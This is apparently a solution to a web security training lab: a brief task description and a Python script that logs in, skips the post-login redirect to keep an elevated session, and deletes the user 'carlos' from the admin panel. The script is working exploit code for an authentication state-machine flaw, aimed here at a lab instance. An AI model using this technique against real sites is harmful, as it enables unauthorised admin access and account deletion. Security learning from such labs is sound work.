# Authentication bypass via flawed state machine

> This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete the user `carlos`.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0ab500e9038c918f80ad30f600fa004d.web-security-academy.net/"

def exploit_state_machine(url):
    session = requests.Session()
    
    # 1. Initialization and CSRF Extraction
    login_endpoint = f"{url}login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    # 2. State Machine Bypass Phase
    # Sending credentials but intentionally dropping the redirect to retain elevated state
    print("[*] Submitting credentials and halting state machine (dropping redirect)...")
    response = session.post(login_endpoint, data=credentials, allow_redirects=False)
    
    if response.status_code == 302:
        print("[+] Redirect dropped. Session elevated.")
        
        # 3. Administrative Execution Phase
        delete_endpoint = f"{url}admin/delete"
        target_params = {"username": "carlos"}
        
        print("[*] Executing target deletion...")
        session.get(delete_endpoint, params=target_params)
        
        # 4. Verification Phase
        final_check = session.get(url)
        if "Congratulations" in final_check.text:
            print("[+] TARGET SECURED: Lab Solved.")
        else:
            print("[-] Execution failed. Target not deleted.")
    else:
        print("[-] Authentication failed or state machine behavior changed.")

if __name__ == "__main__":
    exploit_state_machine(BASE_URL)
```